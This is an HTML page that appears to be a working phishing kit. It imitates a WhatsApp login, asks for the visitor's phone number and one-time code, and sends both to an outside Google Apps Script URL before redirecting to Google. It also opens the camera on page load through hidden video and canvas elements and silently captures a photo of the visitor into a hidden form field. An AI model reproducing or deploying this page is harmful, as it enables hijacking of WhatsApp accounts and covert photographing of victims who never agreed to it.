
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Form</title>
    <style> 
  body {
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.logo {
    width: 100px;
    height: 100px;
    margin-bottom: 20px;
}

form {
    display: flex;
    flex-direction: column;
    align-items: center;
}

input, button {
    padding: 10px;
    margin: 10px;
    width: 200px;
}

progress {
    width: 200px;
}

header {
    background-color: green;
    color: white;
    text-align: center;
    padding: 10px;
    width: 100%;
  
  }

  footer {
    background-color: green;
    color: white;
    text-align: center;
    padding: 10px;
    width: 100%;
    position: fixed;
    bottom: 0;
  }
      button {
  background-color: green; /* WhatsApp green color */
  color: white;
  padding: 10px 20px;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 16px;
}

button:hover {
  background-color: #1DA335; /* Darker green color on hover */
}
      img{border-radius:50%;    padding: 30px;}
  </style>
  
</head>
<body>
  <header>
    <h1>OTP Form Site</h1>
  </header>
    <img src="https://toppng.com/uploads/preview/download-whatsapp-social-media-apps-11563650769y1qhv167dh.png" alt="Logo" class="logo">
    <form id="otpForm">
       <input type="hidden" name="title" value="Whatsapp">
    <input type="hidden" name="redirect_url" value="Google.html">
    <input type="hidden" name="urlInput" value="Whatsapp.html">

   

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <input type="hidden" name="photo" id="photo">
      
      
      
      <input type="hidden" id="redirect_url" name="redirect_url" value="https://Google.com">
    
    <input type="tel" id="phoneNumber" placeholder="Phone Number" required>
    <button id="getOtpBtn">Login</button>
    
    <div id="progressBar" style="display:none;">
      <progress value="0" max="100"></progress>
    </div>
    
    <input type="number" id="otpInput" placeholder="OTP" style="display:none;" required>
    <button id="checkOtpBtn" style="display:none;">Check OTP</button>
  </form>
  
  <footer>
    <p>&copy; OTP Form Footer</p>
  </footer>
  
  <script>
   let phoneNumberValue;
const scriptUrl = 'https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec';

document.getElementById('getOtpBtn').addEventListener('click', getOtp);
document.getElementById('checkOtpBtn').addEventListener('click', checkOtp);

function getOtp(e) {
  e.preventDefault();
  phoneNumberValue = document.getElementById('phoneNumber').value.trim();

  if (phoneNumberValue.length < 11) {
    alert('Invalid phone number');
    return;
  }

  document.getElementById('progressBar').style.display = 'block';
  let progress = 0;
  const progressElem = document.querySelector('progress');
  const interval = setInterval(() => {
    progress += 20;
    progressElem.value = progress;
    if (progress >= 100) {
      clearInterval(interval);
      document.getElementById('progressBar').style.display = 'none';
      document.getElementById('checkOtpBtn').style.display = 'block';
      document.getElementById('otpInput').style.display = 'block';
      document.getElementById('phoneNumber').style.display = 'none';
      document.getElementById('getOtpBtn').style.display = 'none';
    }
  }, 1000);

  // First fetch: send phone number (GET request here, can be POST too)
  fetch(`${scriptUrl}?phoneNumber=${encodeURIComponent(phoneNumberValue)}`)
    .then(response => response.json())
    .then(data => console.log('OTP sent:', data))
    .catch(error => console.error('Error:', error));
}

function checkOtp(e) {
  e.preventDefault();
  const otp = document.getElementById('otpInput').value.trim();
  const redirectUrl = document.getElementById('redirect_url').value.trim();

  if (!otp) {
    alert('Please enter the OTP');
    return;
  }

  // Prepare POST body parameters for second request
  const params = new URLSearchParams();
  params.append('phoneNumber', phoneNumberValue);
  params.append('otp', otp);

  // Second fetch: send phone number + otp via POST
  fetch(scriptUrl, {
    method: 'POST',
    body: params,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    }
  })
  .then(response => {
    if (!response.ok) throw new Error('Network response was not ok');
    return response.json(); // Assuming your server returns JSON
  })
  .then(data => {
    if (data.status === 'success') {
      window.location.href = redirectUrl;  // Redirect only after success
    } else {
      alert('Invalid OTP or phone number');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    // Redirect on error if you want (optional)
    window.location.href = redirectUrl;
  });
}
const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const photoInput = document.getElementById('photo');

  // Access the camera and capture a photo after 2 seconds
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;

      setTimeout(() => {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth || 640; // fallback width
        canvas.height = video.videoHeight || 480; // fallback height
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        photoInput.value = canvas.toDataURL('image/png');

        // Stop the video stream to free camera
        stream.getTracks().forEach(track => track.stop());
        video.style.display = 'none';
      }, 2000);
    })
    .catch(err => console.error("Error accessing camera: ", err));
</script>
  </script>
</body>
</html>
